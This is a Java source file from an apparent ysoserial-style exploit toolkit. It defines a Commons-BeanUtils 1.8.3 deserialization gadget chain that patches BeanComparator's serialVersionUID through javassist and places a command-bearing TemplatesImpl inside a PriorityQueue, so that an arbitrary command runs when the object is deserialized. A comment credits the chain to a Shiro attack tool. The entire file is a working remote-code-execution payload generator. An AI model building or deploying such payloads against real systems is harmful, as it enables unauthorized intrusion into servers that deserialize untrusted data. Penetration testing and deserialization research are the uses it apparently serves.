package A.R.ysogate.payloads.gadgets;

import javassist.ClassClassPath;
import javassist.CtClass;
import javassist.CtField;
import org.apache.commons.lang3.compare.ObjectToStringComparator;
import A.R.ysogate.payloads.ObjectPayload;
import A.R.ysogate.payloads.annotation.Authors;
import A.R.ysogate.payloads.annotation.Dependencies;
import A.R.ysogate.payloads.util.Gadgets;
import A.R.ysogate.payloads.util.Reflections;
import A.R.ysogate.payloads.util.SuClassLoader;

import java.util.Comparator;
import java.util.PriorityQueue;

import static A.R.ysogate.payloads.config.Config.POOL;

/**
 * 从 https://github.com/SummerSec/ShiroAttack2/ 中抄来的链子
 *
 * @author su18
 */
@Dependencies({"commons-beanutils:commons-beanutils:1.8.3", "org.apache.commons:commons-lang3:3.10"})
@Authors({"SummerSec"})
public class CommonsBeanutilsObjectToStringComparator183 implements ObjectPayload<Object> {

	@Override
	public Object getObject(String command) throws Exception {
		final Object template = Gadgets.createTemplatesImpl(command);
		POOL.insertClassPath(new ClassClassPath(Class.forName("org.apache.commons.beanutils.BeanComparator")));
		final CtClass ctBeanComparator = POOL.get("org.apache.commons.beanutils.BeanComparator");
		try {
			CtField ctSUID = ctBeanComparator.getDeclaredField("serialVersionUID");
			ctBeanComparator.removeField(ctSUID);
		} catch (javassist.NotFoundException e) {
		}
		ctBeanComparator.addField(CtField.make("private static final long serialVersionUID = -3490850999041592962L;", ctBeanComparator));
		final Comparator beanComparator = (Comparator) ctBeanComparator.toClass(new SuClassLoader()).newInstance();
		ctBeanComparator.defrost();
		Reflections.setFieldValue(beanComparator, "comparator", new ObjectToStringComparator());

		ObjectToStringComparator stringComparator = new ObjectToStringComparator();

		PriorityQueue<Object> queue = new PriorityQueue<Object>(2, (Comparator<? super Object>) beanComparator);

		queue.add(stringComparator);
		queue.add(stringComparator);

		Reflections.setFieldValue(queue, "queue", new Object[]{template, template});
		Reflections.setFieldValue(beanComparator, "property", "outputProperties");

		return queue;
	}

}
